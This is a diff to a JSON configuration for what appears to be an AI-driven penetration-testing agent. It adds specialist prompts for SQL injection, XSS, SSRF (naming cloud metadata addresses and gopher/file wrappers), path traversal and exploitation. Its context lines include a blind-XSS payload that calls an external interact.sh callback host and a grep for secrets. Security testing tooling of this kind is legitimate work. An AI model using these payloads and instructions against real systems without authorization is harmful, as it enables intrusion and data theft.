@@ -292,5 +292,18 @@
         "trufflehog": "[FALSE POSITIVES] Trufflehog overwhelming. SUGGESTION: Use `gitleaks detect` or manually run `ripgrep` for specific patterns (e.g., `rg -i 'api_key|secret|password'` in `.js` files).",
         "dalfox": "[BLIND XSS] Dalfox failed. SUGGESTION: Use `interactsh-client` and manually inject payload `<script>fetch('http://[id].interact.sh')</script>` into every parameter and header via `var_mapper.py`.",
         "browser_action": "[DOM INTERACTION] Browser automation failed. SUGGESTION: Don't give up. The application might require a specific sequence of clicks or login state. Write a targeted Python Playwright/Puppeteer script to interact with the DOM slowly."
+    },
+    "recon_phase_hints": {
+        "live_host_validation": "CRITICAL: After subdomain enumeration, ALWAYS validate which hosts are alive before port scanning or directory brute-force. Use host probing tools to filter dead/unresolved hosts. Never scan dead hosts."
+    },
+    "specialist_prompts": {
+        "sqli": "Focus EXCLUSIVELY on SQL injection. Test all input parameters for error-based, blind time-based, and UNION-based SQLi. Use manual payloads first, then confirm with automated tooling.",
+        "xss": "Focus EXCLUSIVELY on Cross-Site Scripting (XSS). Test all input reflection points for stored, reflected, and DOM-based XSS. Use manual confirmation first, then automated scanning to verify findings.",
+        "ssrf": "Focus EXCLUSIVELY on SSRF. Test all URL/redirect/callback parameters. Try AWS metadata (169.254.169.254), internal hosts (127.0.0.1, localhost), and protocol wrappers (file://, gopher://, dict://).",
+        "lfi": "Focus EXCLUSIVELY on LFI and Path Traversal. Test all file/path/include parameters with traversal sequences (../), null bytes, and encoding variants.",
+        "recon": "Perform deep reconnaissance ONLY. Enumerate subdomains, open ports, directories, and JavaScript files. Map all endpoints and parameters. Do NOT attempt exploitation.",
+        "exploit": "Test and exploit all discovered input parameters. Use all available fuzzing and scanning tools. Focus on achieving demonstrable impact.",
+        "analyzer": "Focus EXCLUSIVELY on source code and configuration analysis. Use code_analysis tool to run static analysis scans. Review application logic, authentication flows, and data handling patterns. Look for hardcoded secrets, insecure crypto, and logic flaws.",
+        "reporter": "Focus EXCLUSIVELY on generating comprehensive vulnerability reports. Review all findings from the session and create detailed create_vulnerability_report entries for each confirmed issue. Include proper CVSS scores, PoC scripts, and remediation steps."
     }
 }
